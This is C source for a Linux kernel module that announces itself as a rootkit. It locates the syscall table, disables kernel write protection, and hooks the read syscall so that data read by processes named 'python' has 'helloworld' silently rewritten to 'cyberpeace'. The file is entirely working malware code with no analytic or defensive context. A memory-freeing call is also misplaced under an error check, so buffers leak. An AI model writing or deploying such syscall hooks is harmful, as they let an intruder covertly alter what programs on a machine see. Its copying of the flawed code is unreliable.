/*lkm.c*/
 
#include <linux/module.h> // needed for writing modules
#include <linux/kernel.h> // kernel helper functions like printk
#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
#include <asm/paravirt.h> // read_cr0, write_cr0
#include <linux/sched.h> // current task_struct
#include <linux/slab.h> // kmalloc, kfree
#include <asm/uaccess.h> // copy_from_user, copy_to_user
# include <net/tcp.h> // struct tcp_seq_afinfo.
# include <linux/fs.h> // filp_open, filp_close.
# include <linux/seq_file.h> //struct seq_file.
  
 

unsigned long **my_sys_call_table;


unsigned long original_cr0;

int memfind(const char *buffer, const char *str, int dwBufferSize, int dwStrLen)   
{   
	int   strLen,i,j;   
	if (dwStrLen == 0) 
		strLen = strlen(str);   
	else strLen = dwStrLen;   
	for (i = 0; i < dwBufferSize; i++)   
	{   
		for (j = 0; j < strLen; j ++)  
		{
			if (buffer[i+j] != str[j])	
			{
				break;
			}
		}
		if (j == strLen) return i;   
	}   
	return -1;   
}

static unsigned long **aquire_sys_call_table(void)
{
   
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
   
    printk("Starting syscall table scan from: %lx\n", offset);
    while (offset < ULLONG_MAX) {
    
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *) sys_close) {
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
} 
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{

    long ret;
    ret = ref_sys_read(fd, buf, count);
    if (ret >= 6 && fd > 2) {
        if (strcmp(current->comm, "python") == 0) 
		{
            
            long i;

            char *kernel_buf;
            if (count > PAGE_SIZE) {
                
                return ret;
            }
            kernel_buf = kmalloc(count, GFP_KERNEL);
            if (!kernel_buf) {
                
                return ret; 
            }
            if(copy_from_user(kernel_buf, buf, count)) {
                
                kfree(kernel_buf);
                return ret;
            }

			for (i = 0; i < (ret - 10); i++) 
			{
                if (kernel_buf[i] == 'h' &&
                    kernel_buf[i+1] == 'e' &&
                    kernel_buf[i+2] == 'l' &&
                    kernel_buf[i+3] == 'l' &&
                    kernel_buf[i+4] == 'o' &&
                    kernel_buf[i+5] == 'w' &&
					kernel_buf[i+6] == 'o' &&
					kernel_buf[i+7] == 'r' &&
					kernel_buf[i+8] == 'l' &&
					kernel_buf[i+9] == 'd')

				{
                    kernel_buf[i] = 'c';
                    kernel_buf[i+1] = 'y';
                    kernel_buf[i+2] = 'b';
                    kernel_buf[i+3] = 'e';
                    kernel_buf[i+4] = 'r';
                    kernel_buf[i+5] = 'p';
					kernel_buf[i+6] = 'e';
					kernel_buf[i+7] = 'a';
					kernel_buf[i+8] = 'c';
					kernel_buf[i+9] = 'e';
                }
            }

            if(copy_to_user(buf, kernel_buf, count))
                //printk("failed to write to read buffer... :(\n");
            kfree(kernel_buf);
        }
    }
    return ret;
}

static int lkm_init(void)
{
    printk("rootkit loaded\n");
	
	if(!(my_sys_call_table = aquire_sys_call_table()))
       return -1;

    original_cr0 = read_cr0();

    write_cr0(original_cr0 & ~0x00010000);
    ref_sys_read = (void *)my_sys_call_table[__NR_read]; 
    my_sys_call_table[__NR_read] = (unsigned long *)new_sys_read;

    write_cr0(original_cr0);
	
    return 0;    
}
 
static void lkm_exit(void)
{
    printk("rootkit removed\n");
	if(!my_sys_call_table) {
        return;
    }

   
    write_cr0(original_cr0 & ~0x00010000);

    my_sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;

    write_cr0(original_cr0);
}
 
module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
